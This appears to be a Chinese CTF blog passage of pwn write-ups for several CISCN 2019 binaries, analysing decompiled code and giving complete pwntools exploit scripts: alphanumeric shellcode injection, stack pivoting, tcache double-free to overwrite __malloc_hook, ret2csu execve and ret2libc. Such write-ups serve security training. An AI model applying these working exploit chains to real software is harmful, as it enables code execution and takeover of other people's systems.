&#125;      v9 = strlen(nptr) - 1;      if ( dest )      &#123;        puts(&quot;error.&quot;);        exit(5);      &#125;      dest = calloc(v9 + 8, 1uLL);      if ( v9 &lt;= 0 )      &#123;        puts(&quot;error.&quot;);        exit(5);      &#125;      memcpy(dest, nptr, v9);    &#125;    ++v8;  &#125;  *a1 = 0;  sa = a1 + 1;  if ( *sa == &#x27;\\n&#x27; )    *sa = 0;  switch ( v7 )  &#123;    case 2:      sub_DA8(dest);      break;    case 3:      sub_EFE(dest);      break;    case 1:      sub_CBD(dest);      break;    default:      puts(&quot;error.&quot;);      exit(6);  &#125;  return __readfsqword(0x28u) ^ v13;&#125;\n\n很长的一串代码 我们需要先代码审计看一下这串代码目的是什么\nv13 = __readfsqword(0x28u);memset(bss_array, 0, sizeof(bss_array));v8 = 0;v7 = 0;dest = 0LL;\n\n对于几个变量进行了初始化\nwhile ( !*a1 || *a1 != &#x27;\\n&#x27; &amp;&amp; (*a1 != &#x27;\\r&#x27; || a1[1] != 10) )\n\n当a1为\\x00 \\n \\r 时跳出while循环 接着我们来分析一下while中的内容\nif ( v8 &lt;= 5 )      bss_array[2 * v8] = a1;    sb = strchr(a1, &#x27;:&#x27;);    if ( !sb )    &#123;      puts(&quot;error.&quot;);      exit(1);    &#125;    *sb = 0;\n\n首先是第一个判断 v8在while的末尾进行了一个自增运算 是用来限制执行次数的 那么这个while循环最多只能循环六次\n接着在bss段上的一个全局数组存入a1 即我们在main函数中输入的s字符串\n利用strchr函数查找了a1中’:’的位置 如果没有查找到的话就进入if循环 exit退出\n同时将对应的’:’清零\nfor ( sc = sb + 1; *sc &amp;&amp; (*sc == &#x27; &#x27; || *sc == &#x27;\\r&#x27; || *sc == &#x27;\\n&#x27; || *sc == &#x27;\\t&#x27;); ++sc )      *sc = 0;    if ( !*sc )    &#123;      puts(&quot;abort.&quot;);      exit(2);    &#125;\n\n第二次判断 先进行了一个for循环 sc指向’:’的下一个字节处\nfor循环的执行顺序为 先赋值再判断 最后进入循环内 而循环的内容是清零对应地址指向的内容 看到下面的if判断 显然不是我们想要的结果\n所以想办法绕过for循环 那就使得’:’后的一个字节为’ ‘、’\\r’、’\\n’、’\\t’\nif ( v8 &lt;= 5 )      bss_array[2 * v8 + 1] = sc;    sd = strchr(sc, &#x27;\\n&#x27;);    if ( !sd )    &#123;      puts(&quot;error.&quot;);      exit(3);    &#125;*sd = 0;\n\n第三个判断 要求字符串中有\\n 所以上面的判断我们填入的应该是\\n\na1 = sd + 1;    if ( *a1 == &#x27;\\r&#x27; )      *a1++ = 0;    s1 = bss_array[2 * v8];    nptr = bss_array[2 * v8 + 1];\n\na1为’\\n’后的下一个字节处\n如果a1为\\r 那么其下一个字长处为0\n此时将s1和nptr赋值为bss_array 我们回溯一下上面 可以发现在最开始和第三次判断之前进行了赋值\nbss_array[2 * v8] = a1;bss_array[2 * v8 + 1] = sc;\n\n最开始的a1并没有任何的修改 所以此时的s1应该为最开始我们输入的s字符串中’:’前面的字符串\n而sc为’:’后面的字符串 不过由于在第三次判断时 使sd的值为0 sd为sc字符串中’\\n’的  所以sc只剩下’:’后除’\\n’字符串了\nif ( !strcasecmp(s1, &quot;opt&quot;) )    &#123;      if ( v7 )      &#123;        puts(&quot;error.&quot;);        exit(5);      &#125;      v7 = atoi(nptr);    &#125;    else    &#123;      if ( strcasecmp(s1, &quot;msg&quot;) )      &#123;        puts(&quot;error.&quot;);        exit(4);      &#125;      if ( strlen(nptr) &lt;= 1 )      &#123;        puts(&quot;error.&quot;);        exit(5);      &#125;      v9 = strlen(nptr) - 1;      if ( dest )      &#123;        puts(&quot;error.&quot;);        exit(5);      &#125;      dest = calloc(v9 + 8, 1uLL);      if ( v9 &lt;= 0 )      &#123;        puts(&quot;error.&quot;);        exit(5);      &#125;      memcpy(dest, nptr, v9);    &#125;    ++v8;  &#125;\n\n接着来看这个if判断式 如果s1等于’opt’就进入if 否则进入else\nif中将nptr的值赋值给了v7\nelse中计算了nptr的长度 并且减去1后赋值给了v9 最后申请了一块堆空间 将nptr以v9个字节读入到dest中\n*a1 = 0;  sa = a1 + 1;  if ( *sa == &#x27;\\n&#x27; )    *sa = 0;  switch ( v7 )  &#123;    case 2:      sub_DA8(dest);      break;    case 3:      sub_EFE(dest);      break;    case 1:      sub_CBD(dest);      break;    default:      puts(&quot;error.&quot;);      exit(6);  &#125;\n\n最后一个部分 清空了a1的值 sa指向a1字符串的末尾 如果有换行符赋值为0\n最后进行一个switch选择分支 参数为v7\n根据v7的值进入不同的函数 参数为dest\n综上所述 我们需要构造的payload的格式应该为\n     opt:(v7)(x)\\n或者是msg:(dest)(x)\\n其中x是任意单字节的垃圾数据 因为需要使得v9等于dest的长度\n\n接着跟进一下switch分支中的各个函数\nunsigned __int64 __fastcall sub_CBD(const char *a1)&#123;  int i; // [rsp+14h] [rbp-1Ch]  unsigned __int64 v3; // [rsp+18h] [rbp-18h]  v3 = __readfsqword(0x28u);  for ( i = 0; i &lt; strlen(a1); ++i )  &#123;    if ( !isprint(a1[i]) &amp;&amp; a1[i] != 10 )    &#123;      puts(&quot;oh!&quot;);      exit(-1);    &#125;  &#125;  if ( !strcmp(a1, &quot;ro0t&quot;) )  &#123;    unk_202028 = 1;    unk_202024 = 1;  &#125;  else  &#123;    unk_202028 = 1;  &#125;  return __readfsqword(0x28u) ^ v3;&#125;\n\nfor循环中对dest中的字符串进行了检查 isprintf检查字符是否可以被打印 同时&amp;&amp;关联了一个判断式 当dest中没有换行符时才能通过if判断\n接着如果dest字符串的值为ro0t时 unk_202028 &#x3D; unk_202024 &#x3D; 1  否则unk_202028 &#x3D; 1\n这里可能会有疑惑  之前的函数不是将dest中的\\n赋值为了0 这个0会对字符串的判断产生影响吗\n#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main()&#123;    char a[20];    scanf(&quot;%s&quot;,a);    int b;    b=strcasecmp(a,&quot;test&quot;);    printf(&quot;%d&quot;,b);&#125;\n\n这里尝试了一下 答案是不会\n这里还不知道这两个bss段的全局变量值会有什么影响 接着看下一个函数\nunsigned __int64 __fastcall sub_DA8(const char *a1)&#123;  unsigned int v1; // eax  size_t v2; // rax  int i; // [rsp+14h] [rbp-2Ch]  void *dest; // [rsp+18h] [rbp-28h]  unsigned __int64 v6; // [rsp+28h] [rbp-18h]  v6 = __readfsqword(0x28u);  for ( i = 0; i &lt; strlen(a1); ++i )  &#123;    if ( !isprint(a1[i]) &amp;&amp; a1[i] != 10 )    &#123;      puts(&quot;oh!&quot;);      exit(-1);    &#125;  &#125;  if ( unk_202028 != 1 )  &#123;    puts(&quot;oh!&quot;);    exit(-1);  &#125;  if ( unk_202024 )  &#123;    v1 = getpagesize();    dest = mmap(&amp;loc_FFE + 2, v1, 7, 34, 0, 0LL);    v2 = strlen(a1);    memcpy(dest, a1, v2);    (dest)();  &#125;  else  &#123;    puts(a1);  &#125;  return __readfsqword(0x28u) ^ v6;&#125;\n\n开头同样是对于dest字符串进行一个检测 接着如果unk_202028不等于1就结束进程\n如果unk_202024&#x3D;1就进入if分支否则进入else分支 else分支可以打印出a1 但是感觉不太好利用 还是来看看if分支\ngetpagesize获取了当前页的基地址 目的是为了配合mmap函数将该页的权限修改为7 即可读可写可执行\n接着将a1字符串写入到这块内存空间中 最后执行 那显然是shellcode\n并且还得是可见字符串shellcode 否则过不了最开始的判断\n剩下一个函数就没什么好看的了 没啥作用\n可见字符串shellcode要利用alpha3生成 具体的办法我相关博客有写 这里不复述 要注意的是本题的shellcode执行是call rdx\n完整exp:\nfrom pwn import*from struct import packio = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,26603)#io = remote(&quot;1.14.71.254&quot;,28753)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./buu_libc_ubuntu18_64&quot;)#libc = ELF(&quot;./locate&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;amd64&quot;def debug():    gdb.attach(io)    pause()shellcode = &#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;payload1=&#x27;opt:1\\n&#x27;+&#x27;msg:ro0ta\\n&#x27;io.sendlineafter(&quot;&gt;&gt;&gt; &quot;,payload1)payload2 = &#x27;opt:2\\n&#x27;+&#x27;msg:&#x27; + shellcode + &#x27;a\\n&#x27;io.sendlineafter(&quot;&gt;&gt;&gt; &quot;,payload2)io.interactive()\n\nciscn_2019_es_2checksec看一下保护机制\n\nida打开 主函数应该是vul 跟进看一下\nint vul()&#123;  char s[40]; // [esp+0h] [ebp-28h] BYREF  memset(s, 0, 0x20u);  read(0, s, 0x30u);  printf(&quot;Hello, %s\\n&quot;, s);  read(0, s, 0x30u);  return printf(&quot;Hello, %s\\n&quot;, s);&#125;\n\n只能溢出两个字长 只够我们覆盖ebp和ret addr\n这种情况下只能考虑栈迁移了\n先搞清楚为什么出题人会给两个read吧\n栈迁移我们首先需要知道栈帧的地址\n而我们知道 一个栈帧在结束的时候 ebp中存储的是父函数的栈底地址\nprintf函数遇到\\0时就会停止输出 如果我们将s这个数组填满\n那么它就会继续输出下一个字长 这样我们就泄露了ebp的内容\npayload = b&quot;a&quot;*0x27+b&quot;b&quot;\n\n此时我们使用gdb进行动调 目的是为了得到ebp和我们输入的s的偏移(哪怕开启了pie或者RELRO 由于分页机制的特性 偏移是不变的)\n我们将断点打在vul函数的nop汇编的地址\n\n0xa8-0x70 &#x3D; 0x38 于是我们得到 变量s的起始地址为ebp_addr - 0x38\npayload = (b&quot;aaaa&quot;+p32(system_addr)+p32(0)+p32(ebp_addr-0x38+0x10)+b&quot;/bin/sh&quot;).ljust(0x28,b&quot;\\x00&quot;)payload += p32(ebp_addr-0x38)+p32(leave_ret)\n\n这里解释一下p32(ebp_addr-0x38+0x10)\n我们知道 栈迁移需要一个字长的垃圾数据来平衡栈  此时aaaa的地址为ebp_addr-0x38\n&#x2F;bin&#x2F;sh前面的三个字长则占用了0xc字节\n所以此时&#x2F;bin&#x2F;sh的位置则位于ebp_addr-0x38+0x10\n完整exp:\nfrom pwn import*#io = process(&quot;./pwn&quot;)io = remote(&quot;node4.buuoj.cn&quot;,28157)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)io.recvuntil(&quot;Welcome, my friend. What&#x27;s your name?&quot;)payload = b&quot;a&quot;*0x27+b&quot;b&quot;io.send(payload)io.recvuntil(&quot;b&quot;)ebp_addr = u32(io.recv(4))system_addr = 0x8048400binsh_addr = ebp_addr - 0x38+0x10ret_addr = 0x080483a6leave_addr = 0x080484b8 payload = (cyclic(0x4)+p32(system_addr)+p32(0xabcdabcd)+p32(binsh_addr)+b&quot;/bin/sh&quot;).ljust(0x28,b&quot;\\x00&quot;)payload += p32(ebp_addr-0x38)+p32(leave_addr)io.sendline(payload)io.interactive()\n\nciscn-2019-final-3这题没想出来根据堆块地址不断申请到main_arena的chunk 然后泄露基址的思路\n记录一下 扩展一下思路\nchecksec\n\nida反编译 看一下伪代码\nvoid __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  __int64 v3; // rax  int v4; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v5; // [rsp+8h] [rbp-8h]  v5 = __readfsqword(0x28u);  sub_C5A(a1, a2, a3);  v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;welcome to babyheap&quot;);  std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  while ( 1 )  &#123;    menu();    std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;choice &gt; &quot;);    std::istream::operator&gt;&gt;(&amp;std::cin, &amp;v4);    if ( v4 == 1 )    &#123;      add();    &#125;    else if ( v4 == 2 )    &#123;      delete();    &#125;  &#125;&#125;\n\n只给了两个函数 add和delete 其中delete没有置零指针 存在UAF漏洞\nadd函数在申请完chunk后打印了chunk的用户空间区域首地址\n那么此时我们拥有的漏洞只有UAF了 只能利用这个来泄露基址和获取shell\n获取shell好说 这题的环境是Ubuntu18 可以打hook 并且tcache的检查机制没有fastbin那么复杂 可以很轻松的利用double free修改fd来申请任意内存空间的chunk\n那么难点落在泄露libc基址了 题目没有给我们show函数 但是相比其他堆题给了打印申请chunk的地址的机会\n很明显要利用这个来替代show函数\n那么此时就可以利用UAF来申请到一块位于libc基址附近内存区域的chunk\n那么我们可以联想到如果unsortedbin中的单个链表如果只有一个 free chunk 那么其fd和bk域的值就会是main_arena_addr+padding\n此时存放main_arena_addr的地址我们也知道 就可以在tcachebin上窜成一个链表 申请到位于main_arena_addr的堆块\n那么此时add函数中的这条代码就可以输出该chunk的用户空间首地址 即泄露了main_arena_addr 我们就可以得到libc基址\nfrom pwn import*from struct import pack#io = remote(&quot;node4.buuoj.cn&quot;,28487)io = process(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc.so.6&quot;)#libc = ELF(&quot;./locate&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;amd64&quot;def debug():    gdb.attach(io)    pause()def add(index,size,payload):    io.recvuntil(&quot;choice &gt; &quot;)    io.sendline(b&#x27;1&#x27;)    io.recvuntil(&quot;input the index&quot;)    io.sendline(str(index))    io.recvuntil(&quot;input the size&quot;)    io.sendline(str(size))    io.recvuntil(&quot;now you can write something&quot;)    io.send(payload)    io.recvuntil(&quot;gift :&quot;)def delete(index):    io.recvuntil(&quot;choice &gt; &quot;)    io.sendline(b&#x27;2&#x27;)    io.recvuntil(&quot;input the index&quot;)    io.sendline(str(index))add(0,0x70,b&#x27;aaaa&#x27;)add(1,0x70,b&#x27;aaaa&#x27;)heap_addr = int(io.recv(14),16)success(hex(heap_addr))for i in range(1,9):    add(i+1,0x70,b&#x27;aaaa&#x27;)delete(0)delete(0)add(10,0x70,p64(heap_addr-0x10))add(11,0x70,b&#x27;aaaa&#x27;)\n\n此时 我们double free chunk0 此时的链表结构如下图\n\n按照tcachebins单向链表先进后出的原则 此时我们获得是蓝色的那个free chunk 并且tcachebin显示的链表地址是chunk的用户空间首地址\n此时我们将申请的chunk的内容设置为chunk1的首地址 就可以将其作为白色的free chunk的fd域 挂载在链表上 从而我们就可以申请到对应的内存空间\n而利用for循环申请的几个chunk 则是为了等下修改chunk1的size域 从而合并后面的chunk空间 获得一个大于tcachebin范围的chunk 这样就能释放到unsortedbin中了\npayload = p64(0)+p64(0x481)add(12,0x70,payload)add(13,0x20,b&#x27;aaaa&#x27;)add(14,0x20,b&#x27;aaaa&#x27;)delete(1)\n\n此时覆盖chunk1的size域 并且释放chunk1 chunk13是用来后面的double free chunk14是用来防止和top chunk合并\n\n此时我们就成功往unsortedbin中释放了一个chunk\n那么指向main_arena的地址也就是我们上面的heap_addr\n我们用同样的办法 再次利用double free任意申请到一个chunk\ndelete(13)delete(13)add(15,0x20,p64(heap_addr))\n\n\n但是此时的链表结构显示是不全的 其是根据箭头所指的数据来显示free chunk\n使用tel指令可以查看其地址指向\n\nadd(16,0x20,b&#x27;aaaa&#x27;)add(17,0x20,b&#x27;bbbb&#x27;)add(18,0x20,b&#x27;aaaa&#x27;)main_arena_addr = int(io.recv(14),16)success(hex(main_arena_addr))libc_addr = main_arena_addr - (0x7f355d756ca0-0x7f355d36b000)success(hex(libc_addr))onegadget_addr = libc_addr + 0x10a38c\n\n此时我们连续申请三个chunk 申请的第三个chunk就会分配到main_arena的空间\n就成功泄露了基址\nadd(19,0x60,b&#x27;aaaa&#x27;)delete(19)delete(19)malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]add(20,0x60,p64(malloc_hook))add(21,0x60,b&#x27;aaaa&#x27;)add(22,0x60,p64(onegadget_addr))io.recvuntil(&quot;choice &gt; &quot;)io.sendline(b&#x27;1&#x27;)io.recvuntil(&quot;input the index&quot;)io.sendline(b&#x27;23&#x27;)io.recvuntil(&quot;input the size&quot;)io.sendline(b&#x27;0x70&#x27;)io.interactive()\n\n最后一步同理 通过同样的double free办法 获取任意写malloc_hook的机会 将其修改为onegadget 再次调用malloc的时候就会触发onegadget 获取shell\nciscn-2019-s-3Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000)\n\n主体函数非常简单 利用系统调用号实现了一次输入和输出\nsigned __int64 vuln()&#123;  signed __int64 v0; // rax  char buf[16]; // [rsp+0h] [rbp-10h] BYREF  v0 = sys_read(0, buf, 0x400uLL);  return sys_write(1u, buf, 0x30uLL);&#125;\n\n还有一个gadget函数 看一下汇编代码\n.text:00000000004004D6 ; =============== S U B R O U T I N E =======================================.text:00000000004004D6.text:00000000004004D6 ; Attributes: bp-based frame.text:00000000004004D6.text:00000000004004D6                 public gadgets.text:00000000004004D6 gadgets         proc near.text:00000000004004D6 ; __unwind &#123;.text:00000000004004D6                 push    rbp.text:00000000004004D7                 mov     rbp, rsp.text:00000000004004DA                 mov     rax, 0Fh.text:00000000004004E1                 retn.text:00000000004004E1 gadgets         endp ; sp-analysis failed.text:00000000004004E1.text:00000000004004E2 ; ---------------------------------------------------------------------------.text:00000000004004E2                 mov     rax, 3Bh ; &#x27;;&#x27;.text:00000000004004E9                 retn.text:00000000004004E9 ; ---------------------------------------------------------------------------\n\n下方的0x3b则为59 是execve的系统调用号\n应该是构造rop链 但是这题没有办法泄露libc基址 从而也没有办法获取&#x2F;bin&#x2F;sh的地址\n所以只能通过写入栈上\n要想利用栈 先得获得栈的地址 发现sys_write函数可以打印出0x30字节 而buf距离rbp只有0x10\n还有一点需要注意 发现vuln函数的结尾并没有leave指令 也就是说我们只需要覆盖rbp就可以控制程序执行流\n.text:00000000004004ED ; __unwind &#123;.text:00000000004004ED                 push    rbp.text:00000000004004EE                 mov     rbp, rsp.text:00000000004004F1                 xor     rax, rax.text:00000000004004F4                 mov     edx, 400h       ; count.text:00000000004004F9                 lea     rsi, [rsp+buf]  ; buf.text:00000000004004FE                 mov     rdi, rax        ; fd.text:0000000000400501                 syscall                 ; LINUX - sys_read.text:0000000000400503                 mov     rax, 1.text:000000000040050A                 mov     edx, 30h ; &#x27;0&#x27;  ; count.text:000000000040050F                 lea     rsi, [rsp+buf]  ; buf.text:0000000000400514                 mov     rdi, rax        ; fd.text:0000000000400517                 syscall                 ; LINUX - sys_write.text:0000000000400519                 retn.text:0000000000400519 vuln            endp ; sp-analysis failed.text:0000000000400519.text:0000000000400519 ; ---------------------------------------------------------------------------\n\nfrom pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,26678)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;main_addr = elf.sym[&#x27;main&#x27;]payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*7+b&quot;c&quot;+p64(main_addr)io.send(payload)io.recvuntil(&quot;c&quot;)io.recv(16)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;).ljust(8,b&quot;\\x00&quot;))gdb.attach(io)print(hex(stack_addr))\n\n\n可以看到泄露出了栈上的地址 但是此时我们并没有办法得知其与写入栈上的&#x2F;bin&#x2F;sh的偏移\n这里的原因暂时没有办法得知 先放着这个疑问\n下面我们进行系统调用 由于需要用到三个寄存器 所以这里用到csu\n具体的流程我就不过多赘述了\nrdi_addr = 0x4005a3syscall_addr = 0x400517int59_addr = 0x4004E2gadget2_addr = 0x400596gadget1_addr = 0x400580payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*8+p64(int59_addr)+p64(gadget2_addr)payload += cyclic(0x8)payload += p64(0)payload += p64(1)binsh_addr = stack_addr - 0x138payload += p64(binsh_addr+0x10)payload += p64(0)*3payload += p64(gadget1_addr)payload += cyclic(56)payload += p64(rdi_addr)payload += p64(binsh_addr)payload += p64(syscall_addr)io.sendline(payload)\n\n这里重点解释一下三个方面\n1.为什么要多出一个p64(int59_addr)在栈上\n这是因为call指令的问题 他跳转的是对应地址中存储的值 我们如果直接跳转到int59_addr是调用失败的\n2.binsh_addr和stack_addr的偏移是怎么求出来的\n我们将断点打在csu执行到call r12那一行\n然后gdb看一下栈\n\n可以计算出偏移为0x138\n还有第二种办法可以查看到&#x2F;bin&#x2F;sh位于栈上的地址 stack 24实际上是以rsp往高地址方向\n如果我们使rsp的地址减少 就可以做到查看低地址处的栈内容\nset $rsp = $rsp-0x150\n\n\n看到这里你也能够理解我们赋值给r12的binsh_addr+0x10是什么用意了吧\n最终exp:\nfrom pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,26678)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;main_addr = elf.sym[&#x27;main&#x27;]payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*7+b&quot;c&quot;+p64(main_addr)io.send(payload)io.recvuntil(&quot;c&quot;)io.recv(16)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;).ljust(8,b&quot;\\x00&quot;))binsh_addr = stack_addr - 0x138rdi_addr = 0x4005a3syscall_addr = 0x400517int59_addr = 0x4004E2gadget2_addr = 0x400596gadget1_addr = 0x400580payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*8+p64(int59_addr)+p64(gadget2_addr)payload += cyclic(0x8)payload += p64(0)payload += p64(1)payload += p64(binsh_addr+0x10)payload += p64(0)*3payload += p64(gadget1_addr)payload += cyclic(56)payload += p64(rdi_addr)payload += p64(binsh_addr)payload += p64(syscall_addr)io.sendline(payload)io.interactive()\n\n[CISCN 2019华北]PWN1比较简单的一题 看一下保护机制\n\nida查看一下伪代码\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  setvbuf(_bss_start, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 2, 0LL);  func();  return 0;&#125;\n\nmain函数就很简单的清空了缓存区 顺便调用了func函数 跟进一下\nint func()&#123;  int result; // eax  char v1[44]; // [rsp+0h] [rbp-30h] BYREF  float v2; // [rsp+2Ch] [rbp-4h]  v2 = 0.0;  puts(&quot;Let&#x27;s guess the number.&quot;);  gets(v1);  if ( v2 == 11.28125 )    result = system(&quot;cat /flag&quot;);  else    result = puts(&quot;Its value should be 11.28125&quot;);  return result;&#125;\n\n考了一手浮点数传参 比较简单 由于这题保护开的比较少 所以也可以直接栈溢出\n两种做法都演示一下吧 \n1.浮点数传参\n看一下汇编代码 \n\nmovss是处理float精度的浮点数指令 这里顺便扩展一下知识点 处理double精度的浮点数用的是movsd\n针对不同的字节数 还有movsb movsw  ‘b’ ‘w’ ‘d’  分别对应的一位 一字节 双字节\n除此之外还有movzx movsx两兄弟\n你可能也遇到过 我们编写如下程序\n#include &lt;stdio.h&gt;char a[0x100];int main()&#123;      char a = 120;      a += 9;      printf(&quot;%d&quot;,a);&#125;\n\n预期结果应该是129对吧 但是最后的输出结果却是\n\n这是因为char类型变量只有单字节  也就是只有8位 哪怕是无符号数其范围也只有0-255 符号数范围只有-128-127\n显然129就超过了其范围 需要进行扩展 例如利用int型进行一个中转\n而movzx和movsx也起到同样的作用\nmovzx扩展的时候高位全补0  例如0xffff  补全成0x0000ffff\nmovsx扩展的时候根据符号位决定补1还是0 例如0xffff 是负数 那么补1 也就是0xffffffff\n话归正题 我们索引一下浮点数应该是dword_4007F4\n\n取其值传参 0x41348000\nexp:\nfrom pwn import*#io = process(&quot;./pwn&quot;)io = remote(&quot;1.14.71.254&quot;,28934)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;Let&#x27;s guess the number.&quot;)payload = cyclic(0x2c)+p32(0x41348000)# gdb.attach(io,&#x27;b *0x4006A2&#x27;)# pause(0)io.sendline(payload)io.recv()io.recv()\n\n2.ret2text\n很简单 直接贴exp吧\nfrom pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;1.14.71.254&quot;,28934)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;Let&#x27;s guess the number.&quot;)backdoor_addr = 0x4006BEpayload = cyclic(0x38)+p32(backdoor_addr)# gdb.attach(io,&#x27;b *0x4006A2&#x27;)# pause(0)io.sendline(payload)io.recv()io.recv()\n\n[CISCN 2019东北]PWN2比较简单的一题 打ret2text 但是NSS平台上没给libc文件 就用libcsearch来 不过这个也有坑 老版的已经没有维护了 得安装新版本的 新版本的是联网的\nLan1keA&#x2F;LibcSearcher: 🔍 LibcSearcher-ng – get symbols’ offset in glibc. (github.com)\n\n保护机制 我为了方便本地调试把libc依赖更换了 忽视即可\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v4; // [rsp+Ch] [rbp-4h] BYREF  init(argc, argv, envp);  puts(&quot;EEEEEEE                            hh      iii                &quot;);  puts(&quot;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &quot;);  puts(&quot;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &quot;);  puts(&quot;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &quot;);  puts(&quot;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &quot;);  puts(&quot;====================================================================&quot;);  puts(&quot;Welcome to this Encryption machine\\n&quot;);  begin();  while ( 1 )  &#123;    while ( 1 )    &#123;      fflush(0LL);      v4 = 0;      __isoc99_scanf(&quot;%d&quot;, &amp;v4);      getchar();      if ( v4 != 2 )        break;      puts(&quot;I think you can do it by yourself&quot;);      begin();    &#125;    if ( v4 == 3 )    &#123;      puts(&quot;Bye!&quot;);      return 0;    &#125;    if ( v4 != 1 )      break;    encrypt();    begin();  &#125;  puts(&quot;Something Wrong!&quot;);  return 0;&#125;\n\nbegin函数跟进一下\nint begin()&#123;  puts(&quot;====================================================================&quot;);  puts(&quot;1.Encrypt&quot;);  puts(&quot;2.Decrypt&quot;);  puts(&quot;3.Exit&quot;);  return puts(&quot;Input your choice!&quot;);&#125;\n\n只有encrypt函数有点东西 跟进一下\nint encrypt()&#123;  size_t v0; // rbx  char s[48]; // [rsp+0h] [rbp-50h] BYREF  __int16 v3; // [rsp+30h] [rbp-20h]  memset(s, 0, sizeof(s));  v3 = 0;  puts(&quot;Input your Plaintext to be encrypted&quot;);  gets(s);  while ( 1 )  &#123;    v0 = (unsigned int)x;    if ( v0 &gt;= strlen(s) )      break;    if ( s[x] &lt;= &#x27;`&#x27; || s[x] &gt; 122 )    &#123;      if ( s[x] &lt;= 64 || s[x] &gt; 90 )      &#123;        if ( s[x] &gt; 47 &amp;&amp; s[x] &lt;= 57 )          s[x] ^= 0xCu;      &#125;      else      &#123;        s[x] ^= 0xDu;      &#125;    &#125;    else    &#123;      s[x] ^= 0xEu;    &#125;    ++x;  &#125;  puts(&quot;Ciphertext&quot;);  return puts(s);&#125;\n\n对于我们输入的字符串s进行了加密 并且打印出来 不过由于没开canary和pie 又有gets函数 这里直接栈溢出打个ret2text就好了 唯一一点要注意的是就是最后要进行栈对齐 判断方法就是gdb动调一直n下去 卡住的时候如果sp指针末尾是8即需要栈对齐\n\nexp:\nfrom pwn import*from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;1.14.71.254&quot;,28610)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;Input your choice!&quot;)io.sendline(b&#x27;1&#x27;)io.recvuntil(&quot;Input your Plaintext to be encrypted&quot;)rdi_addr = 0x0000000000400c83puts_got = elf.got[&#x27;puts&#x27;]puts_sym = 0x4006e0back_addr = 0x400A47start_addr = elf.sym[&#x27;_start&#x27;]payload = cyclic(0x50+0x8)+p64(rdi_addr)+p64(puts_got)+p64(puts_sym)+p64(start_addr)# gdb.attach(io,&#x27;b *0x400AEE&#x27;)# pause(0)io.sendline(payload)io.recv()io.recvuntil(&quot;\\x7f&quot;)ret_addr = 0x00000000004006b9puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;puts_addr :&quot;+hex(puts_addr))obj = LibcSearcher(&quot;puts&quot;,puts_addr)libc_addr = puts_addr - obj.dump(&quot;puts&quot;)success(&quot;libc_addr :&quot;+hex(libc_addr))system_addr = libc_addr + obj.dump(&quot;system&quot;)binsh_addr = libc_addr + obj.dump(&quot;str_bin_sh&quot;)io.recvuntil(&quot;Input your choice!&quot;)io.sendline(b&#x27;1&#x27;)io.recvuntil(&quot;Input your Plaintext to be encrypted&quot;)payload = cyclic(0x58)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)io.sendline(payload)io.interactive()\n\n[CISCN 2019东南]PWN2看一下保护机制\n\nida看一下伪代码\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  init();  puts(&quot;Welcome, my friend. What&#x27;s your name?&quot;);  vul();  return 0;&#125;\n\n分别跟进一下init函数和vul函数\ninit函数就是清空了缓存区\nint 